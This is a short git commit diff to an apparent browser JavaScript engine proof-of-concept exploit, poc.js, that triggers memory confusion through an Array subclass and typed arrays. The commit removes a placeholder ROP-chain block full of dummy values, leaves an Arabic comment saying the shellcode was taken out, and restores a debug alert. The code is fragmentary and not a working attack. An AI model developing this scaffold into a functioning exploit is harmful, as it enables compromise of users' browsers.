44077eb569e61ee3bbf0557b90313737b409a9b6
Dark-life944 <168915806+Dark-life944@users.noreply.github.com>
2025-10-05 19:35:47 +0100

    Update poc.js

--- 4/poc.js
+++ 4/poc.js
@@ -1,7 +1,7 @@
 /*
 let Trigger = false;
 let Arr = null;
-let ab = new ArrayBuffer(0x2000); // زيادة الحجم
+let ab = new ArrayBuffer(0x1000);
 let y = new Uint32Array(ab);
 
 function Target(Special, Idx, Value) {
@@ -10,17 +10,9 @@ function Target(Special, Idx, Value) {
     Arr[Idx] = Value;
     y[0] = Arr[Idx];
     if (Idx === 0x20 && Trigger) {
-        // ROP Chain افتراضية
-        y[0] = 0xdeadbeef; // gadget افتراضي
-        y[1] = 0x41414141; // قيمة
-        y[2] = 0x12345678; // قفزة
-        y[3] = 0x55555555; // إضافة قيم
-        // محاولة استدعاء دالة موجودة
-        let fakeStack = new Uint32Array(ab, 0, 4);
-        let funcAddr = 0x12345678; // عنوان افتراضي (سيحتاج تعديلًا)
-        window.setTimeout(function() { alert('ROP Success!'); }, 0); // اختبار بديل
+        // تمت إزالة الـ shellcode هنا
     }
-    //alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16) + ', y[0] = ' + y[0].toString(16));
+    alert('Target called, Arr[' + Idx + '] = ' + Arr[Idx].toString(16) + ', y[0] = ' + y[0].toString(16));
 }
 
 class SoSpecial extends Array {
